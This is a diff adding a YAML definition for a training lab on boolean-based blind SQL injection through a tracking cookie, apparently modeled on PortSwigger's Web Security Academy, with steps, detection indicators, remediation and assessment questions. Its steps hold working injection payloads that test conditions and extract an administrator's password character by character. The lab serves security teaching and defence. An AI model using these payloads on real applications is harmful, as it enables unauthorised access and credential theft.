@@ -1,0 +1,102 @@
+# Category: SQL Injection
+name: "Blind SQL injection with conditional responses"
+id: "sql-injection-blind-conditional-responses-001"
+category: "sql_injection"
+subcategory: "blind"
+difficulty: "practitioner"
+estimated_time: "60 minutes"
+
+description: |
+  This lab contains a blind SQL injection vulnerability. The application uses
+  a tracking cookie for analytics, and performs a SQL query containing the
+  value of the submitted cookie. The results of the SQL query are not returned,
+  and no error messages are displayed. However, the application behaves
+  differently depending on whether the query returns any rows.
+
+learning_objectives:
+  - Understand blind SQL injection
+  - Use conditional responses to infer information
+  - Extract data using boolean-based blind injection
+
+tools:
+  - Burp Suite
+  - curl
+  - Python (for automation)
+
+prerequisites:
+  - Basic understanding of SQL
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable cookie"
+    commands:
+      - "# Browse to the lab and intercept a request"
+      - "# Observe the TrackingId cookie"
+    expected_output: "The TrackingId cookie is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Test for blind SQL injection"
+    commands:
+      - "# Inject a condition that is always true"
+      - "TrackingId=xyz' AND 1=1--"
+      - "# Inject a condition that is always false"
+      - "TrackingId=xyz' AND 1=2--"
+      - "# Observe the difference in response"
+    expected_output: "Different responses for true and false conditions"
+    detection: "Web server logs may show unusual cookies"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Extract data using boolean-based blind injection"
+    commands:
+      - "# Check if a user exists"
+      - "TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"
+      - "# Extract password length"
+      - "TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 1--"
+      - "# Extract password character by character"
+      - "TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a'--"
+    expected_output: "Password extracted character by character"
+    detection: "Database logs may show many queries"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Many requests with different cookie values"
+  log_indicators:
+    - "Database error messages (if any)"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  tracking_cookie: "TrackingId"
+
+assessment_questions:
+  - "What is blind SQL injection?"
+  - "How can you use conditional responses to extract data?"
+  - "What is the difference between boolean-based and time-based blind injection?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection/blind"
+    title: "PortSwigger Blind SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+    title: "OWASP Blind SQL Injection"
